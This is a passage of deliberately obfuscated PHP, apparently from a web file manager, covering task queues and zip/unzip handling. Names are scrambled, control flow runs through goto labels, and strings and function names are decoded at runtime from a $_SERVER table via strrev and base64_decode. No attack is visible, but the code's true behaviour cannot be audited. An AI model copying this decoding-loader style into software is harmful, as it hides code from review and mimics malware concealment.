acpk60a3e761($fæ‚à¶ÆßÖ, $c­¬¢àÀ) { $bÀë©¶ãä« =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÊÆ‚ƒÀÆé =& $_SERVER[™ñğşİ€©ˆç]; return $AÊÆ‚ƒÀÆé[13](array($AÊÆ‚ƒÀÆé[14], $AÊÆ‚ƒÀÆé[375]), $fæ‚à¶ÆßÖ, $c­¬¢àÀ); $B÷µÓ†¿âã = $bÀë©¶ãä«[698]; while ($B÷µÓ†¿âã < $bÀë©¶ãä«[596]) { if ($B÷µÓ†¿âã >= 0) { break; } $B÷µÓ†¿âã++; } } public function blkr10765aad($f¿ëÇÁ«Û¨, $fƒÅ…éŒ›Á) { $eŞ’Âô©‘ª =& $_SERVER[™ñğşİ€©ˆç]; return $eŞ’Âô©‘ª[13](array($eŞ’Âô©‘ª[376], $eŞ’Âô©‘ª[377]), $f¿ëÇÁ«Û¨, $fƒÅ…éŒ›Á); } public function dksw2b3b8728($dÏ¬ÅÌ–¼, $BíÀ¿šàÏ) { $aÚÂ®ñ•ê™ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d¸ùÛâ’É¸ =& $_SERVER[™ñğşİ€©ˆç]; return $d¸ùÛâ’É¸[13](array($d¸ùÛâ’É¸[376], $d¸ùÛâ’É¸[378]), $dÏ¬ÅÌ–¼, $BíÀ¿šàÏ); $cåùè˜›ó = $aÚÂ®ñ•ê™[699]; if (strlen($cåùè˜›ó) < $aÚÂ®ñ•ê™[592]) { return; } } } goto eİÆÛß¢Êê; BŸçöŒô: $aóØ˜©–İì = strrev(base64_decode($_SERVER[©Ç§—][0])); function binCheckNeq($f¤‡šˆÑ¶Ÿ, $e§İÁƒîÎë) { return $f¤‡šˆÑ¶Ÿ != $e§İÁƒîÎë; } $_SERVER[$_SERVER[©Ç§—][1]] = $aóØ˜©–İì($_SERVER[$_SERVER[©Ç§—][2]]); goto C˜Ì„¦ŒÜ; a†¾Á‡µ¾: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\153\121\x75\145\165\145\x4c\145\x6e\147\x74\150"; const QUEUE_DATA = "\x74\x61\x73\153\x51\x75\x65\x75\x65\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($d›˜ƒòÜÚ, $eÇÛ©Ï±†· = array(), $a”Ã£ê÷…ù = '', $BÈë¹ÑÈã = '') { $dÜî‡Œ¸…ß =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($BÈë¹ÑÈã && array_find_by_field(self::$listData, $dÜî‡Œ¸…ß[93], $BÈë¹ÑÈã)) { return !0; } self::$listData[] = array($dÜî‡Œ¸…ß[262] => $d›˜ƒòÜÚ, $dÜî‡Œ¸…ß[1587] => $eÇÛ©Ï±†·, $dÜî‡Œ¸…ß[431] => $a”Ã£ê÷…ù, $dÜî‡Œ¸…ß[93] => $BÈë¹ÑÈã); return !0; } public static function addSubmit() { $cŸ¾ßƒ¤œ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($cŸ¾ßƒ¤œ[1588] . json_encode_force(array_to_keyvalue(self::$listData, $cŸ¾ßƒ¤œ[33], $cŸ¾ßƒ¤œ[431])), $cŸ¾ßƒ¤œ[1589]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($fîæ‹¥›Ÿ—, $c ù¸½¡Œ† = array(), $eÑ—Ã¦¡æ¾ = '', $C’½İÚÜàÑ = '') { goto FáÉº†š¸×; Añ®È ¿ã: self::setAll($dÛ¸«º‹È); return !0; goto F»Ì–ªÏÊ; cˆàõ²ßËÜ: if ($C’½İÚÜàÑ && array_find_by_field($dÛ¸«º‹È, $dİÓÑçÔÑñ[93], $C’½İÚÜàÑ)) { return !0; } $dÛ¸«º‹È[] = array($dİÓÑçÔÑñ[262] => $fîæ‹¥›Ÿ—, $dİÓÑçÔÑñ[1587] => $c ù¸½¡Œ†, $dİÓÑçÔÑñ[431] => $eÑ—Ã¦¡æ¾, $dİÓÑçÔÑñ[93] => $C’½İÚÜàÑ); write_log($dİÓÑçÔÑñ[1588] . $eÑ—Ã¦¡æ¾, $dİÓÑçÔÑñ[1589]); goto Añ®È ¿ã; FáÉº†š¸×: $dİÓÑçÔÑñ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::count() >= self::MAX_LENGTH) { return !1; } $dÛ¸«º‹È = self::getAll(); goto cˆàõ²ßËÜ; F»Ì–ªÏÊ: } public static function run() { goto E Ê‰ˆ³æÂ; F‡ªÚÅ¥: return !0; goto c£Ì‰˜Ö; bŞ§„è™¦: try { Hook::apply($bÙœ–š‰‡[$eœŠ±ÜÜ´‚[262]], $bÙœ–š‰‡[$eœŠ±ÜÜ´‚[1587]]); } catch (Exception $e‚ŠĞ±ˆÇ) { } $Fõ«¶”İÍµ = number_format(timeFloat() - $FŞ¸±¶ƒ•¸, 3) . $eœŠ±ÜÜ´‚[1530]; write_log($eœŠ±ÜÜ´‚[1590] . $bÙœ–š‰‡[$eœŠ±ÜÜ´‚[431]] . $eœŠ±ÜÜ´‚[1591] . $Fõ«¶”İÍµ, $eœŠ±ÜÜ´‚[1589]); goto F‡ªÚÅ¥; dœ¾¨­×“: if (!$bÙœ–š‰‡) { return !1; } self::setAll($eÄ²­Ş¨É÷); $FŞ¸±¶ƒ•¸ = timeFloat(); goto bŞ§„è™¦; E Ê‰ˆ³æÂ: $eœŠ±ÜÜ´‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÄ²­Ş¨É÷ = self::getAll(); $bÙœ–š‰‡ = array_shift($eÄ²­Ş¨É÷); goto dœ¾¨­×“; c£Ì‰˜Ö: } public static function count() { $aš’¤Âç¤ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$aš’¤Âç¤) { return 0; } return intval($aš’¤Âç¤); } public static function getAll() { $b¶¥ù„ˆ—Ö = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$b¶¥ù„ˆ—Ö) { return array(); } return $b¶¥ù„ˆ—Ö; } public static function setAll($Aä•ÁŞŸì‚) { $AÍå¶øªß‰ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Aä•ÁŞŸì‚), $AÍå¶øªß‰); Cache::set(self::QUEUE_DATA, $Aä•ÁŞŸì‚, $AÍå¶øªß‰); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($bÕÃ¡±¡Š¬, $E¿‰ÍÃ‡Ğ® = 5.0) { if (!$bÕÃ¡±¡Š¬) { return; } $dËçöôëÎ¬ = Cache::get($bÕÃ¡±¡Š¬); if (!$dËçöôëÎ¬ || timeFloat() - floatVal($dËçöôëÎ¬) >= $E¿‰ÍÃ‡Ğ®) { Cache::set($bÕÃ¡±¡Š¬, timeFloat(), $E¿‰ÍÃ‡Ğ® * 10); return !0; } return !1; } public static function timeLimitCall($c­ŒÚ©™˜, $c§òŠ‹ùù§, $d°Ú¶²†ç², $a½ĞîÀ„’æ = 5.0) { goto f‡Æ—Èõ¨»; f‡Æ—Èõ¨»: $C‡ºñØò³Ç =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$c­ŒÚ©™˜ || !$c§òŠ‹ùù§) { return; } self::$asyncAdd = !0; goto A‰ô´Íå; Dø“²‡ò: Cache::set($aÅõ™æ‡, $b  ß°ÉÚ¬, 60); Cache::removeMemory($aÅõ™æ‡); write_log($C‡ºñØò³Ç[1595] . $c­ŒÚ©™˜ . $C‡ºñØò³Ç[68] . $c§òŠ‹ùù§, $C‡ºñØò³Ç[1589]); goto F—í¦ºÏ‰Ø; A‰ô´Íå: $aÅõ™æ‡ = $C‡ºñØò³Ç[1592]; $b  ß°ÉÚ¬ = Cache::get($aÅõ™æ‡, !0); $Cè‹Š¶‹­ï = array($C‡ºñØò³Ç[1593] => timeFloat(), $C‡ºñØò³Ç[1594] => timeFloat(), $C‡ºñØò³Ç[262] => $c§òŠ‹ùù§, $C‡ºñØò³Ç[1587] => $d°Ú¶²†ç², $C‡ºñØò³Ç[197] => $a½ĞîÀ„’æ); goto FÍ…àéª†; FÍ…àéª†: if (is_array($b  ß°ÉÚ¬[$c­ŒÚ©™˜])) { $Cè‹Š¶‹­ï[$C‡ºñØò³Ç[1594]] = $b  ß°ÉÚ¬[$c­ŒÚ©™˜][$C‡ºñØò³Ç[1594]]; } if (is_array($b  ß°ÉÚ¬[$c­ŒÚ©™˜])) { if (timeFloat() - $b  ß°ÉÚ¬[$c­ŒÚ©™˜][$C‡ºñØò³Ç[1593]] < $Cè‹Š¶‹­ï[$C‡ºñØò³Ç[197]] * 0.3) { return; } $Cè‹Š¶‹­ï[$C‡ºñØò³Ç[1594]] = $b  ß°ÉÚ¬[$c­ŒÚ©™˜][$C‡ºñØò³Ç[1594]]; } $b  ß°ÉÚ¬[$c­ŒÚ©™˜] = $Cè‹Š¶‹­ï; goto Dø“²‡ò; F—í¦ºÏ‰Ø: } public static function timeLimitCallLoop() { goto b„ôñ‚„; E®È¿Ü«: $cêÆëŠ°å = array(); foreach ($B˜¯ßÏ–å as $díªé‚ˆØ² => $a”›Ìµ§À’) { if ($cÑ°ø—Èí‘ - $a”›Ìµ§À’[$B„¶•÷ñ[1594]] > $a”›Ìµ§À’[$B„¶•÷ñ[197]]) { $D›¬Ã“©¤ = !0; try { Hook::apply($a”›Ìµ§À’[$B„¶•÷ñ[262]], $a”›Ìµ§À’[$B„¶•÷ñ[1587]]); write_log($B„¶•÷ñ[1597] . $díªé‚ˆØ² . $B„¶•÷ñ[68] . $a”›Ìµ§À’[$B„¶•÷ñ[262]] . $B„¶•÷ñ[1598] . ACTION, $B„¶•÷ñ[1589]); } catch (Exception $CÂ©¢ù´) { } continue; } $cêÆëŠ°å[$díªé‚ˆØ²] = $a”›Ìµ§À’; } if (!$D›¬Ã“©¤) { return; } goto CÏŸƒ¢ãë; b„ôñ‚„: $B„¶•÷ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÕ¹¿Ø¬¾á = array($B„¶•÷ñ[1596]); $D•ñÚ‘¹ = in_array(strtolower(ACTION), $EÕ¹¿Ø¬¾á); goto FğßŒ‹ã¥˜; a„Ò×ÎØ× : if (!$B˜¯ßÏ–å || count($B˜¯ßÏ–å) <= 0) { return; } $D›¬Ã“©¤ = !1; $cÑ°ø—Èí‘ = timeFloat(); goto E®È¿Ü«; CÏŸƒ¢ãë: if (!$cêÆëŠ°å) { return Cache::remove($b¤ôÄÊ°ï°); } Cache::set($b¤ôÄÊ°ï°, $cêÆëŠ°å, 60); Cache::removeMemory($b¤ôÄÊ°ï°); goto CÒ°ßÀäè÷; FğßŒ‹ã¥˜: if (!$D•ñÚ‘¹ && !self::$asyncAdd) { return; } $b¤ôÄÊ°ï° = $B„¶•÷ñ[1592]; $B˜¯ßÏ–å = Cache::get($b¤ôÄÊ°ï°, !0); goto a„Ò×ÎØ× ; CÒ°ßÀäè÷: } public static function finished($AÚŒ¾”£­, $aå‡Ë‰‰ùù) { $b”˜Õè÷£ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($b”˜Õè÷£[262] => $AÚŒ¾”£­, $b”˜Õè÷£[1587] => $aå‡Ë‰‰ùù); } private static function finishedRun() { $EÏ×ĞŠõŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $AÜÀˆ¯é¸±) { try { Hook::apply($AÜÀˆ¯é¸±[$EÏ×ĞŠõŠ[262]], $AÜÀˆ¯é¸±[$EÏ×ĞŠõŠ[1587]]); } catch (Exception $BòÌ˜Ÿ·‚…) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto eÛˆ‹Ì£Ö‡; d¥¨¦Ö§‹µ: if (!$f¢×ãæœñ[$C ¥“º£ô[1423]]) { $f¢×ãæœñ[$C ¥“º£ô[1423]] = LNG($C ¥“º£ô[1603]); } goto D‡¤Ö¬ˆÒÕ; eÛˆ‹Ì£Ö‡: $C ¥“º£ô =& $_SERVER[ÒÆ›ÆØÎ¾]; parent::startAfter(); Hook::bind($C ¥“º£ô[1599], array($this, $C ¥“º£ô[1600])); goto Dô÷„Ì…Üº; Dô÷„Ì…Üº: Hook::bind($C ¥“º£ô[1080], array($this, $C ¥“º£ô[1601])); $f¢×ãæœñ =& $this->task; $f¢×ãæœñ[$C ¥“º£ô[1602]] = $C ¥“º£ô[1085]; goto d¥¨¦Ö§‹µ; D‡¤Ö¬ˆÒÕ: } protected function endAfter() { $D…æ‘Ë“æğ =& $_SERVER[ÒÆ›ÆØÎ¾]; parent::endAfter(); Hook::unbind($D…æ‘Ë“æğ[1599], array($this, $D…æ‘Ë“æğ[1600])); Hook::unbind($D…æ‘Ë“æğ[1080], array($this, $D…æ‘Ë“æğ[1601])); } public function updateAfter() { $f“µ³Ó éÅ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÊëÈâ ´® =& $this->task; if (!$DÊëÈâ ´®[$f“µ³Ó éÅ[1012]] || !$DÊëÈâ ´®[$f“µ³Ó éÅ[715]]) { return; } if ($DÊëÈâ ´®[$f“µ³Ó éÅ[1602]] == $f“µ³Ó éÅ[1085]) { $CßÚêÉÖ÷ = 0; if ($DÊëÈâ ´®[$f“µ³Ó éÅ[1561]]) { $CßÚêÉÖ÷ = $DÊëÈâ ´®[$f“µ³Ó éÅ[1562]] / $DÊëÈâ ´®[$f“µ³Ó éÅ[1561]]; } $DÊëÈâ ´®[$f“µ³Ó éÅ[1518]] = $CßÚêÉÖ÷ * 0.3; } else { if ($DÊëÈâ ´®[$f“µ³Ó éÅ[1602]] == $f“µ³Ó éÅ[311]) { $CßÚêÉÖ÷ = $DÊëÈâ ´®[$f“µ³Ó éÅ[1027]] / $DÊëÈâ ´®[$f“µ³Ó éÅ[1012]]; $DÊëÈâ ´®[$f“µ³Ó éÅ[1518]] = 0.3 + $CßÚêÉÖ÷ * 0.4; } else { if ($DÊëÈâ ´®[$f“µ³Ó éÅ[1602]] == $f“µ³Ó éÅ[107]) { $Få¨Ñó¿ÕÜ = 0; if ($DÊëÈâ ´®[$f“µ³Ó éÅ[1563]] == $f“µ³Ó éÅ[107]) { $Få¨Ñó¿ÕÜ = $DÊëÈâ ´®[$f“µ³Ó éÅ[1562]]; } $CßÚêÉÖ÷ = ($DÊëÈâ ´®[$f“µ³Ó éÅ[1566]] + $Få¨Ñó¿ÕÜ) / $DÊëÈâ ´®[$f“µ³Ó éÅ[715]]; $DÊëÈâ ´®[$f“µ³Ó éÅ[1518]] = 0.3 + 0.4 + $CßÚêÉÖ÷ * 0.3; } } } if ($DÊëÈâ ´®[$f“µ³Ó éÅ[1518]] > 0) { $Eï‚˜òñÇ• = timeFloat() - $DÊëÈâ ´®[$f“µ³Ó éÅ[741]] - $DÊëÈâ ´®[$f“µ³Ó éÅ[1521]]; $DÊëÈâ ´®[$f“µ³Ó éÅ[1522]] = $Eï‚˜òñÇ• * (1 - $DÊëÈâ ´®[$f“µ³Ó éÅ[1518]]) / $DÊëÈâ ´®[$f“µ³Ó éÅ[1518]]; } } public function addFile($Fç‹Èá–Ó±) { goto dÔ‚¨Õ±¹; C®¥µÍÅÂ–: $this->update(); goto dò«ô¶º’; DÆ †ñÃ¤: $fÍ°É»’„·[$DêßÆ÷²¾[1014]] = $DêßÆ÷²¾[1578]; $fÍ°É»’„·[$DêßÆ÷²¾[1563]] = $DêßÆ÷²¾[1085]; $fÍ°É»’„·[$DêßÆ÷²¾[715]] = $AÇàƒã•Ø[$DêßÆ÷²¾[78]]; goto eÙŒÜ‚¢ä; dÔ‚¨Õ±¹: $DêßÆ÷²¾ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÍ°É»’„· =& $this->task; $AÇàƒã•Ø = IO::info($Fç‹Èá–Ó±); goto bŠŸÔ¼‘; bŠŸÔ¼‘: $fÍ°É»’„·[$DêßÆ÷²¾[1559]] = $AÇàƒã•Ø[$DêßÆ÷²¾[28]]; $fÍ°É»’„·[$DêßÆ÷²¾[1561]] = $AÇàƒã•Ø[$DêßÆ÷²¾[78]]; $fÍ°É»’„·[$DêßÆ÷²¾[1562]] = 0; goto DÆ †ñÃ¤; eÙŒÜ‚¢ä: $fÍ°É»’„·[$DêßÆ÷²¾[1012]] = 1; $AÔÂ¿°…ÖŒ = 0; $fÍ°É»’„·[$DêßÆ÷²¾[1570]] = array($DêßÆ÷²¾[1571] => $AÔÂ¿°…ÖŒ + 1, $DêßÆ÷²¾[413] => $AÇàƒã•Ø[$DêßÆ÷²¾[28]], $DêßÆ÷²¾[76] => $AÇàƒã•Ø[$DêßÆ÷²¾[76]], $DêßÆ÷²¾[495] => $AÇàƒã•Ø[$DêßÆ÷²¾[495]] ? $AÇàƒã•Ø[$DêßÆ÷²¾[495]] : $AÇàƒã•Ø[$DêßÆ÷²¾[76]]); goto C®¥µÍÅÂ–; dò«ô¶º’: } public function unzipAfter($F¨å£Ëí®) { goto b±Ï£™ÙÜÂ; b±Ï£™ÙÜÂ: $b™ÇÔ¯¬Ú” =& $_SERVER[ÒÆ›ÆØÎ¾]; $dº•ïˆô¼ñ =& $this->task; $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1602]] = $b™ÇÔ¯¬Ú”[107]; goto e¼˜¨â¤âÀ; cÁ‹Ô÷ïóŒ: $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1027]] = 0; $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1561]] = 0; $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1562]] = 0; goto dÒŒ†Ö´ƒ; dÒŒ†Ö´ƒ: $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1559]] = $b™ÇÔ¯¬Ú”[33]; $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1566]] = 0; $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[715]] = $Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[78]]; goto B›ßòÔëÂ; B›ßòÔëÂ: $this->update(); self::log($b™ÇÔ¯¬Ú”[1604] . json_encode(array($dº•ïˆô¼ñ, $Dæ—Ğù‹äò))); goto BÛÜßƒªŒó; E»ì‘²Øİ: if ($Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[29]] == $b™ÇÔ¯¬Ú”[193]) { $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1012]] = 1; } else { $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1012]] = $Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[81]][$b™ÇÔ¯¬Ú”[79]]; } $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1014]] = $b™ÇÔ¯¬Ú”[33]; $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1563]] = 0; goto cÁ‹Ô÷ïóŒ; e¼˜¨â¤âÀ: $Dæ—Ğù‹äò = IO::infoWithChildren($F¨å£Ëí®); $F™Œß¡œ = 0; $dº•ïˆô¼ñ[$b™ÇÔ¯¬Ú”[1570]] = array($b™ÇÔ¯¬Ú”[1571] => $F™Œß¡œ + 1, $b™ÇÔ¯¬Ú”[413] => $Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[28]], $b™ÇÔ¯¬Ú”[76] => $Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[76]], $b™ÇÔ¯¬Ú”[495] => $Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[495]] ? $Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[495]] : $Dæ—Ğù‹äò[$b™ÇÔ¯¬Ú”[76]]); goto E»ì‘²Øİ; BÛÜßƒªŒó: } public function nameParse($Bè¹Š¨²µ) { goto b±Ñ±¥á¢«; b×ãµåÄõÄ: $this->update(); goto bâÄ»µ¸; b±Ñ±¥á¢«: $cÒŞÙ÷â¢è =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÙêÎ¥Ñâ‹ =& $this->task; if ($dÙêÎ¥Ñâ‹[$cÒŞÙ÷â¢è[1602]] == $cÒŞÙ÷â¢è[1085]) { $dÙêÎ¥Ñâ‹[$cÒŞÙ÷â¢è[1602]] = $cÒŞÙ÷â¢è[311]; $dÙêÎ¥Ñâ‹[$cÒŞÙ÷â¢è[1566]] = 0; $dÙêÎ¥Ñâ‹[$cÒŞÙ÷â¢è[715]] = 0; } goto B±’•Âí÷³; B±’•Âí÷³: $C½š••àÂº = get_path_this($Bè¹Š¨²µ); if (strstr($C½š••àÂº, $cÒŞÙ÷â¢è[95])) { $dÙêÎ¥Ñâ‹[$cÒŞÙ÷â¢è[1027]] += 1; $dÙêÎ¥Ñâ‹[$cÒŞÙ÷â¢è[1012]] += 1; } $dÙêÎ¥Ñâ‹[$cÒŞÙ÷â¢è[1559]] = $Bè¹Š¨²µ; goto b×ãµåÄõÄ; bâÄ»µ¸: } } goto AéªôÍáÜ; C¡Öë‚ê‹: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $dî³”¦Ü; if (!$dî³”¦Ü) { $c»¥­´®‹ = IO::init($_SERVER[ÒÆ›ÆØÎ¾][8]); } return $c»¥­´®‹; } private static function iconvSystem($C°”£É¯‡£) { return self::local()->iconvSystem($C°”£É¯‡£); } private static function iconvApp($bâ¦Ø­“Õ°) { return self::local()->iconvApp($bâ¦Ø­“Õ°); } public static function zip($E²Ø¾£Ï˜, $döŞÇÅ‚Áç = "\172\x69\x70", $F¤Ú¸‰ÓÑù = '', $c²æ–¨ã¬ = REPEAT_RENAME) { goto FÓ·„‰š„Ï; cæœÉì¤Û: foreach ($Eßç‚îÍ¢ù as $aÌ‚Šä›øÑ => $Cé‚šùÂ…) { $Eßç‚îÍ¢ù[$aÌ‚Šä›øÑ] = self::iconvSystem($Cé‚šùÂ…); } KodArchive::create($dÌö“¡ÌÌ, $Eßç‚îÍ¢ù); if (!IO::exist($dÇ˜–’œâ)) { if ($E•å°¹¡”à) { del_dir($E•å°¹¡”à); } show_json(LNG($e·À÷“¡Úô[1072]), !1); } goto CğùŞ»ôäÇ; bÒÀ·‹¶–—: if (count($Eßç‚îÍ¢ù) > 1) { $fƒÖóšÕÌ = IO::info(IO::pathFather($eˆ±õæàÅÛ[$e·À÷“¡Úô[76]])); $D‡ˆ˜„Øæ“ = $fƒÖóšÕÌ[$e·À÷“¡Úô[28]]; } $fŠğ•Î“İ¡ = $E•å°¹¡”à; if (!$fŠğ•Î“İ¡) { $fŠğ•Î“İ¡ = get_path_father($eˆ±õæàÅÛ[$e·À÷“¡Úô[76]]); if (!$F¤Ú¸‰ÓÑù && $CÏ§à·ó˜»->getType() == $e·À÷“¡Úô[106]) { $fŠğ•Î“İ¡ = get_path_father($CÏ§à·ó˜»->path); } $E•Ïğªå‚È = IO::info($fŠğ•Î“İ¡); if (!$E•Ïğªå‚È[$e·À÷“¡Úô[196]]) { show_json(LNG($e·À÷“¡Úô[1071]), !1); } } goto e…¤æÄÑ¦±; e…¤æÄÑ¦±: $dÇ˜–’œâ = $fŠğ•Î“İ¡ . $D‡ˆ˜„Øæ“ . $e·À÷“¡Úô[95] . $döŞÇÅ‚Áç; $dÇ˜–’œâ = get_filename_auto($dÇ˜–’œâ, $e·À÷“¡Úô[33], $c²æ–¨ã¬); $dÌö“¡ÌÌ = self::iconvSystem($dÇ˜–’œâ); goto cæœÉì¤Û; e»ÔÅÚÅÆŒ: $E•å°¹¡”à = !1; if (!$F¤Ú¸‰ÓÑù && $CÏ§à·ó˜»->getType() == $e·À÷“¡Úô[106]) { $Eßç‚îÍ¢ù = self::zipFileList($E²Ø¾£Ï˜); } else { $E•å°¹¡”à = $F¤Ú¸‰ÓÑù ? $F¤Ú¸‰ÓÑù : TEMP_FILES . $e·À÷“¡Úô[1070] . time() . rand_string(8) . $e·À÷“¡Úô[8]; mk_dir($E•å°¹¡”à); $Eßç‚îÍ¢ù = self::zipFileList($E²Ø¾£Ï˜, $E•å°¹¡”à); } $D‡ˆ˜„Øæ“ = $eˆ±õæàÅÛ[$e·À÷“¡Úô[28]]; goto bÒÀ·‹¶–—; FÓ·„‰š„Ï: $e·À÷“¡Úô =& $_SERVER[ÒÆ›ÆØÎ¾]; $CÏ§à·ó˜» = self::init($E²Ø¾£Ï˜[0][$e·À÷“¡Úô[76]]); $eˆ±õæàÅÛ = self::info($E²Ø¾£Ï˜[0][$e·À÷“¡Úô[76]]); goto e»ÔÅÚÅÆŒ; CğùŞ»ôäÇ: if ($F¤Ú¸‰ÓÑù || !$E•å°¹¡”à) { if ($E•å°¹¡”à && strstr($E•å°¹¡”à, TEMP_FILES)) { $bÔòƒŠ = $Eßç‚îÍ¢ù = array(); recursion_dir($fŠğ•Î“İ¡, $bÔòƒŠ, $Eßç‚îÍ¢ù, 0); foreach ($bÔòƒŠ as $d¨â’§ò¡’) { del_dir($d¨â’§ò¡’); } foreach ($Eßç‚îÍ¢ù as $BÆŠµŒùí) { if ($BÆŠµŒùí == $dÌö“¡ÌÌ) { continue; } del_file($BÆŠµŒùí); } } return $dÇ˜–’œâ; } $dßŠ¢ß‡Ã¤ = self::pathFather($eˆ±õæàÅÛ[$e·À÷“¡Úô[76]]); $dß½²Ù‹œ = self::move($dÇ˜–’œâ, $dßŠ¢ß‡Ã¤, $c²æ–¨ã¬); goto BãŒÅƒæ¦Ó; BãŒÅƒæ¦Ó: if (!$dß½²Ù‹œ) { del_dir($E•å°¹¡”à); show_json(LNG($e·À÷“¡Úô[1072]), !1); } del_dir($E•å°¹¡”à); return $dß½²Ù‹œ; goto cÚïõ³ØÊ´; cÚïõ³ØÊ´: } public static function unzip($aË…„÷­‰‹, $cêİõ–ñ…í = "\162\145\160\154\x61\143\145") { goto EàßîŒêØ–; eé³§ÈŠØ: return !0; goto Aá£ñò¨¯; AÃÙñê‚¨Ù: $CÇÑ“ì®õ = self::tmpFileName($B”öí…«Ù); $CÏÆ’»¨Ø = TEMP_FILES . $CÇÑ“ì®õ; del_dir($CÏÆ’»¨Ø); goto AÇãµ±Ò„–; EàßîŒêØ–: $aÔèËÉàÔƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D–¢Ÿ›£ = $aË…„÷­‰‹[$aÔèËÉàÔƒ[76]]; $C±¸³–èŒÀ = $aË…„÷­‰‹[$aÔèËÉàÔƒ[1073]]; goto EÎ‰šÀóÛî; Bó°›´õŞí: if (!@file_exists(self::iconvSystem($CÖ¼Ö¼‹Ê))) { $BàñÛÇÃãŒ = self::localFilePath($D–¢Ÿ›£, $CÉŒœÂİŒ›); $CÖ¼Ö¼‹Ê = $BàñÛÇÃãŒ ? $BàñÛÇÃãŒ : parent::download($D–¢Ÿ›£, $CÖ¼Ö¼‹Ê); } $CÖ¼Ö¼‹Ê = self::iconvSystem($CÖ¼Ö¼‹Ê); $C¹ ½±çùÅ = isset($aË…„÷­‰‹[$aÔèËÉàÔƒ[1075]]) ? $aË…„÷­‰‹[$aÔèËÉàÔƒ[1075]] : $aÔèËÉàÔƒ[1076]; goto Eô¨‹‰Óİ†; EÎ‰šÀóÛî: if (!($B”öí…«Ù = parent::info($D–¢Ÿ›£))) { show_json(LNG($aÔèËÉàÔƒ[1074]), !1); } if (!($D„¯„ÚÕŒ• = parent::infoFull($C±¸³–èŒÀ))) { $C±¸³–èŒÀ = parent::mkdir($C±¸³–èŒÀ); $D„¯„ÚÕŒ• = array($aÔèËÉàÔƒ[76] => $C±¸³–èŒÀ); } else { if (isset($D„¯„ÚÕŒ•[$aÔèËÉàÔƒ[395]]) && trim($D„¯„ÚÕŒ•[$aÔèËÉàÔƒ[76]], $aÔèËÉàÔƒ[8]) != trim($C±¸³–èŒÀ, $aÔèËÉàÔƒ[8])) { $bŠÄ§¤Á² = KodIO::make($D„¯„ÚÕŒ•[$aÔèËÉàÔƒ[478]]); $FŸ‘Îñœ¶ = parent::fileNameAuto($bŠÄ§¤Á², $D„¯„ÚÕŒ•[$aÔèËÉàÔƒ[28]], REPEAT_RENAME_FOLDER, !0); $C±¸³–èŒÀ = parent::mkdir($bŠÄ§¤Á² . $FŸ‘Îñœ¶); $D„¯„ÚÕŒ• = array($aÔèËÉàÔƒ[76] => $C±¸³–èŒÀ); } } $C±¸³–èŒÀ = $D„¯„ÚÕŒ•[$aÔèËÉàÔƒ[76]]; goto AÃÙñê‚¨Ù; F…Ô—ÚÉ“: foreach ($CÆÍ™Æà°¥ as $e¶äİ¿ãÔˆ) { $e¶äİ¿ãÔˆ = self::iconvApp($e¶äİ¿ãÔˆ); self::move($e¶äİ¿ãÔˆ, $C±¸³–èŒÀ, $cêİõ–ñ…í); } del_dir($CÏÆ’»¨Ø); if (!$BàñÛÇÃãŒ) { del_file($CÖ¼Ö¼‹Ê); } goto eé³§ÈŠØ; AÇãµ±Ò„–: mk_dir($CÏÆ’»¨Ø); $CÉŒœÂİŒ› = self::fileExt($B”öí…«Ù); $CÖ¼Ö¼‹Ê = $CÏÆ’»¨Ø . $aÔèËÉàÔƒ[95] . $CÉŒœÂİŒ›; goto Bó°›´õŞí; c¦à±…×ç: Hook::trigger($aÔèËÉàÔƒ[1080], $CÏÆ’»¨Ø); recursion_dir($CÏÆ’»¨Ø, $DÔ¿±ÏèÎ, $FÅå•ªİ¥„, 0); $CÆÍ™Æà°¥ = 